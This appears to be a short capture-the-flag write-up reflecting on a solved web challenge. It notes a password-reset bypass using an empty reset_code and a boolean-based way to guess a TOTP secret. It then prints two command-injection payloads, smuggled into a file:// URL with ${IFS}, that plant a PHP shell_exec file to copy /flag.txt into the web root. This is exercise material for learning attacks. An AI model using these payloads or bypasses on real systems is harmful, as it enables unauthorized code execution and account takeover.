Things I coulda improved on:
- Instead of getting a new code everytime I may have been able to apply an empty code at set_new_password.php after resetting once because it gets set to NULL in the code so I coulda done &reset_code=
^^ empty so it would be NULL.
- Instead of timebased I could've just seen if the password changed to the random value and if not then it would mean the TOTP_secret is not that character sequence (boolean based).


<img width="1121" alt="Screenshot 2024-11-24 at 2 33 43 AM" src="https://github.com/user-attachments/assets/1737af52-de68-48eb-91e9-8c0d1edcc6ba">


# this would NOT work:
# file:///ededed;echo${IFS}"<?php;shell_exec(\"echo$\".\"{IFS}'1'>>/var/www/html/lol.txt\");?>">/var/www/html/shell.php

# this would!
# file:///ededed;echo${IFS}"<?php\nshell_exec(\"cat$\".\"{IFS}/flag.txt>>/var/www/html/lol.txt\");?>">/var/www/cron.php
